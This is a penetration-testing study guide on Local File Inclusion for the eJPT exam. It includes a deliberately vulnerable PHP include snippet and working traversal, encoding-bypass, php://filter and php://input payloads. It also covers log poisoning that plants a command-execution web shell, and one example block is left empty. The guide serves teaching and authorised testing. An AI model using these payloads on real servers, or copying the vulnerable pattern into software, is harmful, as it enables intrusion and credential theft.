# Local File Inclusion (LFI)

Local File Inclusion (LFI) is a web application vulnerability that allows an attacker to read files stored on the web server by manipulating file path parameters. LFI is commonly caused by applications that dynamically include files without properly validating user input. Depending on the server configuration, LFI can lead to information disclosure, credential theft, source code disclosure, and even Remote Code Execution (RCE).

LFI is a common vulnerability encountered during the **INE eJPT** exam and is an important skill for every penetration tester.

---

# What is Local File Inclusion?

A vulnerable application includes local files based on user input.

```
User Input

↓

Web Application

↓

include()

↓

Local File

↓

Displayed Content
```

Example PHP code:

```php
<?php
$page = $_GET['page'];
include($page);
?>
```

Normal request:

```
http://target/index.php?page=home.php
```

The application loads:

```
home.php
```

# Basic Directory Traversal

Attempt to move outside the web directory.

Example:

```

```


# URL Encoding

Applications may block `../`.

Encode it instead.

```
../

↓

..%2f

↓

..%252f
```

Examples:

```
..%2f..%2f..%2fetc/passwd

..%252f..%252fetc/passwd
```

---

# Double URL Encoding

Some filters decode input only once.

```
../

↓

%252e%252e%252f
```

---

# Null Byte Injection

Older PHP versions:

```
?page=../../../../etc/passwd%00
```

This bypassed forced file extensions such as:

```php
include($page . ".php");
```

Modern PHP versions no longer support this technique.

# PHP Wrappers

PHP provides wrappers that can be abused during LFI.

---

## php://filter

Read PHP source code instead of executing it.

Example:

```
php://filter/convert.base64-encode/resource=index.php
```

Result:

```
PD9waHAgZWNobyAiSGVsbG8iOyA/Pg==
```

Decode with:

```bash
echo "BASE64" | base64 -d
```

---

## php://input

Useful when Remote Code Execution is possible.

Example:

```
POST /index.php?page=php://input
```

Body:

```php
<?php system($_GET['cmd']); ?>
```

---

# Log File Poisoning

If PHP code can be written into a log file, LFI may execute it.

Example:

```
User-Agent:

<?php system($_GET['cmd']); ?>
```

Then include:

```
?page=/var/log/apache2/access.log
```

Execute:

```
?cmd=id
```

---

# SSH Log Poisoning

Sometimes:

```
/var/log/auth.log
```

can also be abused.

# Detecting LFI

Indicators include:

- Application loads unexpected files.
- PHP warnings mentioning `include()` or `require()`.
- Contents of `/etc/passwd` displayed.
- Error messages exposing filesystem paths.
- Source code disclosure through PHP wrappers.

---

# LFI vs RFI

| Local File Inclusion | Remote File Inclusion |
|----------------------|-----------------------|
| Includes local files | Includes remote files |
| Reads server files | Downloads remote code |
| More common | Less common |
| May lead to RCE | Usually immediate RCE |

---

# Common Mistakes

Avoid these mistakes:

- Assuming every path traversal vulnerability is LFI.
- Ignoring URL encoding bypasses.
- Forgetting Windows file paths.
- Testing only `/etc/passwd`.
- Missing opportunities to use PHP wrappers.
- Forgetting log poisoning techniques.

---

# eJPT Tips

During the **INE eJPT** exam:

- Test every parameter that references files or templates.
- Start with `../../../../etc/passwd`.
- If blocked, try URL encoding and double encoding.
- Read configuration files after confirming LFI.
- Check for credentials inside configuration files.
- Use **Burp Repeater** to test payloads quickly.
- If PHP is detected, test `php://filter` to read source code.
- Always look for log poisoning opportunities that could lead to Remote Code Execution.

# Summary

Local File Inclusion (LFI) allows attackers to include local files on the server by manipulating file path parameters. Successful exploitation can expose sensitive files, application source code, configuration files, credentials, and server logs. In some scenarios, LFI can be escalated into Remote Code Execution through techniques such as PHP wrappers or log poisoning. During the **INE eJPT** exam, systematically test file-related parameters, verify directory traversal, enumerate sensitive files, and leverage Burp Suite to efficiently identify and exploit Local File Inclusion vulnerabilities.
